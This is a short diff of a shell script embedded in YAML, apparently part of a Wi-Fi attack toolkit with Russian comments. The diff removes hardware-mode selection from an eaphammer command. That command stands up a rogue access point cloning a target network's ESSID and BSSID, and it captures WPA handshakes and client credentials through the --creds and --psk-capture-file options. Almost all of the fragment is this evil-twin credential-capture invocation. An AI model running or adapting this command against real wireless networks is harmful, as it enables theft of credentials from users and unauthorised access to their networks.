@@ -86,8 +86,7 @@ script: |-
       sudo iw $interface set type managed;
       sudo ip link set $interface up;
       sudo nmcli dev set $interface managed yes;
-      if [[ "$chn" -le "14" ]]; then hwmode=g; elif [[ -n "$chn" ]] then hwmode=a; else hwmode=g; fi;
-      sudo timeout -s INT -k 20s #timeout# eaphammer --hw-mode "$hwmode" --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
+      sudo timeout -s INT -k 20s #timeout# eaphammer --interface "$interface" --essid "$essid" --auth wpa-psk --password 00000000 --creds --psk-capture-file "$aphsfile" --bssid "$bssid" --channel "$channel";
       
       # Выход
       stop_mon_screen; sleep 1;
